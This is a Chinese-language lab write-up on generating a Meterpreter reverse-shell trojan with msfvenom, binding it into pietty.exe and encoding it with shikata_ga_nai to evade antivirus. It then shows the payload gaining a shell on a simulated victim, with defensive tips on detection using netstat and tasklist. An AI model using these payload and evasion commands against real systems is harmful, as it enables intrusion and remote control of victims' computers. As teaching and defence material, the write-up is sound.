製作一支簡單的木馬 並以模擬的方式讓被害者啟動 並控制受害者電腦

使用msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.106(本機IP 但厲害的攻擊者不會使用自己真的IP) LPORT=8888(要連接的port) -f 
exe> /home/rayui/test.exe(產生的檔案類型及位置)

![5](https://user-images.githubusercontent.com/49279418/117013936-e5c02400-ad22-11eb-9e76-0edfbe855a7f.png)

接者使用virus total網站來測試病毒
可以發現如此簡單的病毒都可以通過部份的防毒軟體
所以anti-virus(資安軟硬體)的選擇很重要
![6](https://user-images.githubusercontent.com/49279418/117014742-ac3be880-ad23-11eb-9eee-edce28c847f7.png)

接著做綑綁的測試(使用的是pietty.exe) 要做綑綁的原因很簡單目的是混淆防毒軟體 
而防毒軟體是去測試檔案是否有病毒的特徵 所以防毒軟體的更新很重要(不然有新型病毒一樣中招)
使用msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.106 LPORT=8888 -f exe 
-x /home/rayui/pietty0400b14.exe(拿來綑綁的檔案) -o /home/rayui/test2.exe(輸出目標)
![7](https://user-images.githubusercontent.com/49279418/117016799-a21ae980-ad25-11eb-9efc-14d998866bd4.png)


一樣使用virus total網站來測試病毒
可以發現有明顯的改進(可以使用msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.106 LPORT=8888 
-e x86/shikata_ga_nai -i 5(編碼次數) -f exe -o /home/rayui/test2.exe 來達成多次編碼以避免被偵測)
![8](https://user-images.githubusercontent.com/49279418/117017189-fcb44580-ad25-11eb-8190-baf1857e0e40.png)

接著模擬受害者點選到網頁並下載木馬程式
(此部分使用的是社交工程 在此就跳過社交工程的細節假設受害者以上鉤 避免方法)
要注意的還有攻擊者可以透過在網頁中寫惡意程式並不需要下載 甚至在mail中就可以寫入惡意程式
這部份可以透過教育訓練避免點擊可疑的內容 或是可以藉由DMZ在DMZ區收件
![9](https://user-images.githubusercontent.com/49279418/117021915-5c145480-ad2a-11eb-8ad3-48241b38a565.png)

此時在攻擊端做監聽的動作 此時若有人點擊惡意程式就可以成功連結到受害者(用screenshot來證明確實連接成功)
並可以透過shell指令來進入被害者的指令列來執行惡意動作
![10](https://user-images.githubusercontent.com/49279418/117023051-54a17b00-ad2b-11eb-8314-8e871c556bc8.png)

此時若受害者想要阻止此連線可以透過netstat指令查看當前連線 或是使用其他網路監控程式如wireshark都可以看到有異常連線
並對照PID(使用tasklist指令)就可以找出是哪個程式在執行此動作並關閉
![11](https://user-images.githubusercontent.com/49279418/117024206-5d468100-ad2c-11eb-98ee-50ebd1dd99e8.png)
![12](https://user-images.githubusercontent.com/49279418/117024376-8404b780-ad2c-11eb-8c60-056c100bc121.png)
